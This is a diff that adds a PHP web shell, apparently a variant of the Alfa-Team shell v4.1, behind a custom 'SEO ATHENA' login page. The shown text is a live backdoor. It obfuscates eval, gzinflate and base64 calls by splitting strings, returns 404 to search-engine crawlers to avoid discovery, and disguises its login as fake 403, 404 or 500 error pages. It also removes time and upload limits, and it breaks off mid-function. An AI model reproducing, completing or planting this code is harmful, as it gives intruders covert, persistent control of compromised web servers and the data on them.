@@ -1,0 +1,1378 @@
+<?php
+session_start();
+$password = "a31fcf01da58ec702fa5aa596b1af4e1"; 
+
+function login_shell()
+{
+?>
+<html>
+<head>
+    <title>VENNN SHELL</title>
+	<link rel="shortcut icon" type="image/x-icon" href="https://brrbrrpatapim.site/img/Desire.png" />
+    <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+</head>
+<body onload="writeContent(true)">
+    <div class="wrap">
+        <div class="grid"></div>
+        <div class="scan"></div>
+        <div class="vignette"></div>
+
+        <h1>SEO ATHENA</h1>
+        <p id="matrix">~People Come And Go~</p>
+
+        <!-- Form -->
+        <form class="card" method="post" action="">
+            <label for="password">Password</label>
+            <div class="field">
+                <input class="input" id="password" name="pass" type="password" placeholder="••••••••" required />
+            </div>
+            <input class="btn" type="submit" name="submit" value="LOGIN">
+        </form>
+
+        <!-- Teks Animasi Ngetik -->
+        <div id="myContent">SELESAI GA SELESAI KUMPULIN</div>
+        <div id="contentToWrite" >
+        </div>
+    </div>
+
+    <!-- Snowstorm -->
+    <script src="https://nathanprinsley-files.prinsh.com/data-1/js/efek-salju-faisal.js"></script>
+    <script>
+        snowStorm.snowColor = '#ff0000';
+        snowStorm.flakesMaxActive = 96;
+        snowStorm.useTwinkleEffect = true;
+
+        // Efek teks ngetik
+        var charIndex = -1, stringLength = 0, inputText;
+        function writeContent(init) {
+            if (init) { inputText = document.getElementById("contentToWrite").innerHTML; }
+            if (charIndex == -1) { charIndex = 0; stringLength = inputText.length; }
+            var initString = document.getElementById("myContent").innerHTML;
+            initString = initString.replace(/<SPAN.*$/gi, "");
+            var theChar = inputText.charAt(charIndex);
+            var nextFourChars = inputText.substr(charIndex, 4);
+            if (nextFourChars == "<br>" || nextFourChars == "<br>") { theChar = "<br>"; charIndex += 3; }
+            initString = initString + theChar + "<span id='blink'>_</span>";
+            document.getElementById("myContent").innerHTML = initString;
+            charIndex = charIndex / 1 + 1;
+            if (charIndex <= stringLength) { setTimeout("writeContent(false)", 100); } else { blinkSpan(); }
+        }
+        var currentStyle = "inline";
+        function blinkSpan() {
+            currentStyle = currentStyle == "inline" ? "none" : "inline";
+            document.getElementById("blink").style.display = currentStyle;
+            setTimeout("blinkSpan()", 500);
+        }
+    </script>
+</body>
+</html>
+<style>
+    :root {
+        --bg: #07080a;
+        --panel: #0b0f17;
+        --txt: #e7f6ff;
+        --muted: #8aa3b7;
+        --neon1: #1eff00;
+        --neon2: #ffee00;
+        --neon3: #ff0800;
+        --err: #ff6b8b;
+        --ok: #7affc6;
+    }
+
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0
+    }
+
+    html,
+    body {
+        height: 100%;
+        background: var(--bg);
+        color: var(--txt);
+        font-family: "Trebuchet MS", sans-serif;
+        overflow: hidden;
+    }
+
+    /* Wrapper */
+    .wrap {
+        position: relative;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 16px;
+        padding: 20px;
+    }
+
+    /* Background image */
+    .grid {
+        position: absolute;
+        inset: 0;
+
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        filter: saturate(1.2) contrast(1.05);
+        z-index: -1;
+    }
+
+    .scan {
+        position: absolute;
+        inset: 0;
+        background: url(https://i.imgur.com/dHmqL9W.png) !important;
+        opacity: .100;
+    }
+
+    .vignette {
+        position: absolute;
+        inset: 0;
+        box-shadow: inset 0 0 180px rgba(0, 0, 0, .7);
+    }
+
+    /* Judul Animasi */
+    h1 {
+        font-family: 'Valorant', cursive;
+        font-size: 60px;
+        color: #ffffff;
+        text-shadow:
+            0 0 5px #ff00e6,
+            0 0 10px #000000,
+            0 0 20px #ff00e6,
+            0 0 40px #ff0088,
+            0 0 80px #ff0044;
+        margin-bottom: 0px;
+        text-align: center;
+        animation: flicker 5s infinite;
+    }
+
+    @keyframes flicker {
+
+        0%,
+        18%,
+        22%,
+        25%,
+        53%,
+        57%,
+        100% {
+            opacity: 1;
+            text-shadow:
+                0 0 5px #ff00e6,
+                0 0 10px #ff00e6,
+                0 0 20px #ff00e6,
+                0 0 40px #ff0044,
+                0 0 80px #ff0044;
+        }
+
+        20%,
+        24%,
+        55% {
+            opacity: 0.1;
+            text-shadow: none;
+        }
+    }
+
+    #matrix {
+        font-size: 18px;
+        color: #ffffff;
+        text-shadow: 0 0 10px red, 0 0 40px #ff0077;
+        font-weight: bold;
+
+    }
+
+    /* Card form */
+    .card {
+        position: relative;
+        width: min(92%, 420px);
+        padding: 28px 24px 24px;
+        border-radius: 20px;
+        background: linear-gradient(180deg, rgba(11, 15, 23, .85), rgba(9, 12, 19, .9));
+        border: 1px solid rgba(0, 247, 255, .15);
+        box-shadow: 0 20px 60px rgba(0, 0, 0, .6);
+        backdrop-filter: blur(6px) saturate(1.1);
+        overflow: hidden;
+    }
+
+    /* Neon border muter */
+    .card::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        border-radius: 20px;
+        padding: 2px;
+        background: linear-gradient(90deg, var(--neon1), var(--neon2), var(--neon3), var(--neon1));
+        background-size: 300% 300%;
+        -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+        -webkit-mask-composite: xor;
+        mask-composite: exclude;
+        animation: borderFlow 5s linear infinite;
+        pointer-events: none;
+        z-index: 1;
+    }
+
+    @keyframes borderFlow {
+        0% {
+            background-position: 0% 50%;
+        }
+
+        50% {
+            background-position: 100% 50%;
+        }
+
+        100% {
+            background-position: 0% 50%;
+        }
+    }
+
+    label {
+        display: block;
+        margin: 12px 0 6px;
+        font-size: .8rem;
+        color: #cfe8ff;
+    }
+
+    .field {
+        position: relative;
+        z-index: 2
+    }
+
+    .input {
+        width: 100%;
+        padding: 14px 44px 14px 14px;
+        border-radius: 14px;
+        outline: none;
+        color: var(--txt);
+        background: linear-gradient(180deg, #0a0f16, #0b1119);
+        border: 1px solid rgba(0, 247, 255, .22);
+        box-shadow: 0 0 0 1px rgba(255, 0, 200, .12) inset, 0 6px 18px rgba(0, 0, 0, .4);
+    }
+
+    .eye {
+        position: absolute;
+        right: 8px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: #0a0f16;
+        color: #a6d9ff;
+        border: 1px solid rgba(0, 247, 255, .25);
+        border-radius: 10px;
+        cursor: pointer;
+        padding: 6px 10px;
+    }
+
+    .btn {
+        width: 100%;
+        margin-top: 14px;
+        padding: 14px 16px;
+        border: none;
+        border-radius: 14px;
+        font-weight: 900;
+        text-transform: uppercase;
+        letter-spacing: .12em;
+        background: linear-gradient(90deg, var(--neon3), var(--neon2), var(--neon3));
+        background-size: 200% 100%;
+        color: #021013;
+        box-shadow: 0 10px 30px rgba(0, 247, 255, .25), 0 0 32px rgba(255, 0, 200, .23);
+        cursor: pointer;
+        animation: flow 6s linear infinite;
+    }
+
+    @keyframes flow {
+        0% {
+            background-position: 0 0
+        }
+
+        100% {
+            background-position: 200% 0
+        }
+    }
+
+    .err,
+    .ok {
+        display: none;
+        font-size: .85rem;
+        margin-top: 10px
+    }
+
+    .err {
+        color: var(--err)
+    }
+
+    .ok {
+        color: var(--ok)
+    }
+
+	</style>
+
+<?php
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+} else {
+/*
+	Author: 	Solevisible/Alfa-Team
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
+*/
+$GLOBALS['oZgNypoPRU'] = array(
+    'username' => 'alfa',
+    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
+    'safe_mode' => '0',
+    'login_page' => '403',
+    'show_icons' => '1',
+    'post_encryption' => false,
+    'cgi_api' => false,
+);
+
+$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
+$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
+$OVpGNqqFZs = 'e' . 'v' . 'al';
+$psDEwGhsxg = 'gz' . 'inf' . 'late';
+
+if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
+{
+    function vcnvSCZgBz($data)
+    {
+        if (empty($data)) return;
+        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
+        $ac = 0;
+        $enc = '';
+        $tmp_arr = array();
+        if (!$data)
+        {
+            return $data;
+        }
+        do
+        {
+            $o1 = $aztJtafUXm($data, $i++);
+            $o2 = $aztJtafUXm($data, $i++);
+            $o3 = $aztJtafUXm($data, $i++);
+            $bits = $o1 << 16 | $o2 << 8 | $o3;
+            $h1 = $bits >> 18 & 0x3f;
+            $h2 = $bits >> 12 & 0x3f;
+            $h3 = $bits >> 6 & 0x3f;
+            $h4 = $bits & 0x3f;
+            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
+        }
+        while ($i < strlen($data));
+        $enc = implode($tmp_arr, '');
+        $r = (strlen($data) % 3);
+        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
+    }
+    function charCodeAt($data, $char)
+    {
+        return ord(substr($data, $char, 1));
+    }
+    function charAt($data, $char)
+    {
+        return substr($data, $char, 1);
+    }
+}
+else
+{
+    function vcnvSCZgBz($s)
+    {
+        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
+        return $b($s);
+    }
+}
+if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
+{
+    function zRtSHsbTzV($input)
+    {
+        if (empty($input)) return;
+        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        $chr1 = $chr2 = $chr3 = "";
+        $enc1 = $enc2 = $enc3 = $enc4 = "";
+        $i = 0;
+        $output = "";
+        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
+        do
+        {
+            $enc1 = strpos($keyStr, substr($input, $i++, 1));
+            $enc2 = strpos($keyStr, substr($input, $i++, 1));
+            $enc3 = strpos($keyStr, substr($input, $i++, 1));
+            $enc4 = strpos($keyStr, substr($input, $i++, 1));
+            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
+            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
+            $chr3 = (($enc3 & 3) << 6) | $enc4;
+            $output = $output . chr((int)$chr1);
+            if ($enc3 != 64)
+            {
+                $output = $output . chr((int)$chr2);
+            }
+            if ($enc4 != 64)
+            {
+                $output = $output . chr((int)$chr3);
+            }
+            $chr1 = $chr2 = $chr3 = "";
+            $enc1 = $enc2 = $enc3 = $enc4 = "";
+        }
+        while ($i < strlen($input));
+        return $output;
+    }
+}
+else
+{
+    function zRtSHsbTzV($s)
+    {
+        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
+        return $b($s);
+    }
+}
+
+function __ZW5jb2Rlcg($s)
+{
+    return vcnvSCZgBz($s);
+}
+function __ZGVjb2Rlcg($s)
+{
+    return zRtSHsbTzV($s);
+}
+
+$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
+
+foreach ($GLOBALS['DB_NAME'] as $key => $value)
+{
+	$prefix = substr($key, 0, 2);
+	if ($prefix == "us")
+	{
+		$GLOBALS['DB_NAME']["user"] = $value;
+		$GLOBALS['DB_NAME']["user_rand"] = $key;
+	}
+	elseif ($prefix == "pa")
+	{
+		$GLOBALS['DB_NAME']["pass"] = $value;
+		$GLOBALS['DB_NAME']["pass_rand"] = $key;
+	}
+	elseif ($prefix == "sa")
+	{
+		$GLOBALS['DB_NAME']["safemode"] = $value;
+		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
+	}
+	elseif ($prefix == "lo")
+	{
+		$GLOBALS['DB_NAME']["login_page"] = $value;
+		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
+	}
+	elseif ($prefix == "sh")
+	{
+		$GLOBALS['DB_NAME']["show_icons"] = $value;
+		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
+	}
+	elseif ($prefix == "po")
+	{
+		$GLOBALS['DB_NAME']["post_encryption"] = $value;
+		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
+	}
+	elseif ($prefix == "cg")
+	{
+		$GLOBALS['DB_NAME']["cgi_api"] = $value;
+		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
+	}
+}
+
+unset($GLOBALS['oZgNypoPRU']);
+
+if (!isset($_SERVER["HTTP_HOST"])) exit();
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
+if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
+if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
+if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
+if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
+if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
+if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
+define("__ALFA_VERSION__", "4.1");
+define("__ALFA_UPDATE__", "2");
+define("__ALFA_CODE_NAME__", "Tesla");
+define("__ALFA_DATA_FOLDER__", "ANJAY_MABAR_COI");
+define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
+define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
+$GLOBALS['__ALFA_COLOR__'] = array(
+		"shell_border" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				".header" => "border: 7px solid {color}",
+				"#meunlist" => "border-color: {color}",
+				"#hidden_sh" => "background-color: {color}",
+				".ajaxarea" => "border: 1px solid {color}",
+				".foot" => "border-color: {color}",
+			)
+		),
+		"header_vars" => "#27979B",
+		"header_values" => "#67ABDF",
+		"header_on" => "#00FF00",
+		"header_off" => "#ff0000",
+		"header_none" => "#00FF00",
+		"home_shell" => "#ff0000",
+		"home_shell:hover" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".home_shell:hover" => "color: {color};",
+			)
+		),
+		"back_shell" => "#efbe73",
+		"back_shell:hover" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".back_shell:hover" => "color: {color};",
+			)
+		),
+		"header_pwd" => "#00FF00",
+		"header_pwd:hover" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".header_pwd:hover" => "color: {color};",
+			)
+		),
+		"header_drive" => "#00FF00",
+		"header_drive:hover" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".header_drive:hover" => "color: {color};",
+			)
+		),
+		"header_show_all" => "#00FF00",
+		"disable_functions" => "#ff0000",
+		"footer_text" => "#27979B",
+		"menu_options" => "#27979B",
+		"menu_options:hover" => array(
+			"key_color" => "#646464",
+			"multi_selector" => array(
+				".menu_options:hover" => "background-color: {color};font-weight: unset;",
+			)
+		),
+		"options_list" => array(
+			"key_color" => "#00FF00",
+			"multi_selector" => array(
+				".content_options_holder .header center a" => "color: {color};",
+			)
+		),
+		"options_list:hover" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".content_options_holder .header center a:hover" => "color: {color};",
+			)
+		),
+		"options_list_header" => array(
+			"key_color" => "#59cc33",
+			"multi_selector" => array(
+				".txtfont_header" => "color: {color};",
+			)
+		),
+		"options_list_text" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".txtfont,.tbltxt" => "color: {color};",
+			)
+		),
+		"Alfa+" => array(
+			"key_color" => "#06ff0f",
+			"multi_selector" => array(
+				".alfa_plus" => "color: {color};font-weight: unset;",
+			)
+		),
+		"hidden_shell_text" => array(
+			"key_color" => "#00FF00",
+			"multi_selector" => array(
+				"#hidden_sh a" => "color: {color};",
+			)
+		),
+		"hidden_shell_version" => "#ff0000",
+		"shell_name" => "#FF0000",
+		"main_row:hover" => array(
+			"key_color" => "#646464",
+			"multi_selector" => array(
+				".main tr:hover" => "background-color: {color};",
+			)
+		),
+		"main_header" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".main th" => "color: {color};",
+			)
+		),
+		"main_name" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".main .main_name" => "color: {color};font-weight: unset;",
+			)
+		),
+		"main_size" => "#67ABDF",
+		"main_modify" => "#67ABDF",
+		"main_owner_group" => "#67ABDF",
+		"main_green_perm" => "#25ff00",
+		"main_red_perm" => "#FF0000",
+		"main_white_perm" => "#FFFFFF",
+		"beetween_perms" => "#FFFFFF",
+		"main_actions" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".main .actions" => "color: {color};",
+			)
+		),
+		"menu_options:hover" => array(
+			"key_color" => "#646464",
+			"multi_selector" => array(
+				".menu_options:hover" => "background-color: {color};font-weight: unset;",
+			)
+		),
+		"minimize_editor_background" => array(
+			"key_color" => "#0e304a",
+			"multi_selector" => array(
+				".minimized-wrapper" => "background-color: {color};",
+			)
+		),
+		"minimize_editor_text" => array(
+			"key_color" => "#f5deb3",
+			"multi_selector" => array(
+				".minimized-text" => "color: {color};",
+			)
+		),
+		"editor_border" => array(
+			"key_color" => "#0e304a",
+			"multi_selector" => array(
+				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
+			)
+		),
+		"editor_background" => array(
+			"key_color" => "rgba(0, 1, 23, 0.94)",
+			"multi_selector" => array(
+				".editor-explorer,.editor-modal" => "background-color: {color};",
+			)
+		),
+		"editor_header_background" => array(
+			"key_color" => "rgba(21, 66, 88, 0.93)",
+			"multi_selector" => array(
+				".editor-header" => "background-color: {color};",
+			)
+		),
+		"editor_header_text" => array(
+			"key_color" => "#00ff7f",
+			"multi_selector" => array(
+				".editor-path" => "color: {color};",
+			)
+		),
+		"editor_header_button" => array(
+			"key_color" => "#1d5673",
+			"multi_selector" => array(
+				".close-button, .editor-minimize" => "background-color: {color};",
+			)
+		),
+		"editor_actions" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".editor_actions" => "color: {color};",
+			)
+		),
+		"editor_file_info_vars" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".editor_file_info_vars" => "color: {color};",
+			)
+		),
+		"editor_file_info_values" => array(
+			"key_color" => "#67ABDF",
+			"multi_selector" => array(
+				".filestools" => "color: {color};",
+			)
+		),
+		"editor_history_header" => array(
+			"key_color" => "#14ff07",
+			"multi_selector" => array(
+				".hheader-text,.history-clear" => "color: {color};",
+			)
+		),
+		"editor_history_list" => array(
+			"key_color" => "#03b3a3",
+			"multi_selector" => array(
+				".editor-file-name" => "color: {color};",
+			)
+		),
+		"editor_history_selected_file" => array(
+			"key_color" => "rgba(49, 55, 93, 0.77)",
+			"multi_selector" => array(
+				".is_active" => "background-color: {color};",
+			)
+		),
+		"editor_history_file:hover" => array(
+			"key_color" => "#646464",
+			"multi_selector" => array(
+				".file-holder > .history:hover" => "background-color: {color};",
+			)
+		),
+		"input_box_border" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				"input[type=text],textarea" => "border: 1px solid {color}",
+			)
+		),
+		"input_box_text" => array(
+			"key_color" => "#999999",
+			"multi_selector" => array(
+				"input[type=text],textarea" => "color: {color};",
+			)
+		),
+		"input_box:hover" => array(
+			"key_color" => "#27979B",
+			"multi_selector" => array(
+				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+			)
+		),
+		"select_box_border" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				"select" => "border: 1px solid {color}",
+			)
+		),
+		"select_box_text" => array(
+			"key_color" => "#FFFFEE",
+			"multi_selector" => array(
+				"select" => "color: {color};",
+			)
+		),
+		"select_box:hover" => array(
+			"key_color" => "#27979B",
+			"multi_selector" => array(
+				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+			)
+		),
+		"button_border" => array(
+			"key_color" => "#27979B",
+			"multi_selector" => array(
+				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
+			)
+		),
+		"button:hover" => array(
+			"key_color" => "#27979B",
+			"multi_selector" => array(
+				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
+				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+			)
+		),
+		"outputs_text" => array(
+			"key_color" => "#67ABDF",
+			"multi_selector" => array(
+				".ml1" => "color: {color};",
+			)
+		),
+		"outputs_border" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				".ml1" => "border: 1px solid {color};",
+			)
+		),
+		"uploader_border" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+			)
+		),
+		"uploader_background" => array(
+			"key_color" => "#0E304A",
+			"multi_selector" => array(
+				".inputfile strong" => "background-color: {color};",
+			)
+		),
+		"uploader_text_right" => array(
+			"key_color" => "#FFFFFF",
+			"multi_selector" => array(
+				".inputfile strong" => "color: {color};",
+			)
+		),
+		"uploader_text_left" => array(
+			"key_color" => "#25ff00",
+			"multi_selector" => array(
+				".inputfile span" => "color: {color};",
+			)
+		),
+		"uploader:hover" => array(
+			"key_color" => "#27979B",
+			"multi_selector" => array(
+				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
+			)
+		),
+		"uploader_progress_bar" => array(
+			"key_color" => "#00ff00",
+			"multi_selector" => array(
+				".up_bar" => "background-color: {color};",
+			)
+		),
+		"mysql_tables" => "#00FF00",
+		"mysql_table_count" => "#67ABDF",
+		"copyright" => "#dfff00",
+		"scrollbar" => array(
+			"key_color" => "#1e82b5",
+			"multi_selector" => array(
+				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
+			)
+		),
+		"scrollbar_background" => array(
+			"key_color" => "#000115",
+			"multi_selector" => array(
+				"*::-webkit-scrollbar-track" => "background-color: {color};",
+			)
+		),
+);
+$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
+$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
+//@session_start();
+@session_write_close();
+@ignore_user_abort(true);
+@set_time_limit(0);
+@ini_set('memory_limit', '-1');
+@ini_set("upload_max_filesize", "9999m");
+if($config['AlfaProtectShell']){
+$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
+$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
+if($config['AlfaLoginPage'] == 'gui'){
+if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
+if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
+}
+echo '
+<style>
+body{background: black;}
+#loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
+#loginbox td { border-radius:5px; font-size:11px; }
+</style>
+<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<center><img style="border-radius:100px;" width="200" height="200" alt="alfa team 2012" draggable="false" src="https://brrbrrpatapim.site/img/Desire.png" /></center>
+<div id=loginbox><p><font face="verdana,arial" size=-1>
+<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
+<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
+<tr><td bgcolor="black" style="padding:5">
+<form method="post">
+<input type="hidden" name="action" value="login">
+<input type="hidden" name="hide" value="">
+<center><table>
+<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
+<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
+<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
+</div><br /></center>';
+exit;
+}
+}elseif($config['AlfaLoginPage']=='500'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
+}
+echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
+exit;
+}
+}elseif($config['AlfaLoginPage']=='403'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
+}
+echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+exit;
+}
+}elseif($config['AlfaLoginPage']=='404'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+@header('location: '.$_SERVER["PHP_SELF"]);
+}
+echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+exit;
+}
+}
+}
+function decrypt_post($str){
+	if(__ALFA_POST_ENCRYPTION__){
+		$pwd = __ALFA_SECRET_KEY__;
+		$pwd     = __ZW5jb2Rlcg($pwd);
+		$str     = __ZGVjb2Rlcg($str);
+		$enc_chr = "";
+		$enc_str = "";
+		$i       = 0;
+		while ($i < strlen($str)) {
+			for ($j = 0; $j < strlen($pwd); $j++) {
+				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
+				$enc_str .= $enc_chr;
+				$i++;
+				if ($i >= strlen($str))
+					break;
+			}
+		}
+		return __ZGVjb2Rlcg($enc_str);
+	}else{
+		return __ZGVjb2Rlcg($str);
+	}
+}
+
+function _AlfaSecretKey(){
+	$secret = @$_COOKIE["AlfaSecretKey"];
+	if(!isset($_COOKIE["AlfaSecretKey"])){
+		$secret = uniqid(mt_rand(), true);
+		__alfa_set_cookie("AlfaSecretKey", $secret);
+	}
+	return $secret;
+}
+function alfa_getColor($target){
+	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
+		return $GLOBALS["DB_NAME"]["color"][$target];
+	}else{
+		$target = $GLOBALS["__ALFA_COLOR__"][$target];
+		if(is_array($target)){
+			return $target["key_color"];
+		}else{
+			return $target;
+		}
+	}
+}
+function alfaCssLoadColors(){
+	$css = "";
+	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
+		if(!is_array($value)){
+			$value = alfa_getColor($key);
+			$css .= ".{$key}{color: {$value};}";
+		}else{
+			if(isset($value["multi_selector"])){
+				foreach($value["multi_selector"] as $k => $v){
+					$color = alfa_getColor($key);
+					$code = str_replace("{color}", $color, $v);
+					$css .=  $k."{".$code."}";
+				}
+			}
+		}
+	}
+	return $css;
+}
+if(isset($_POST['ajax'])){
+function AlfaNum(){
+$args = func_get_args();
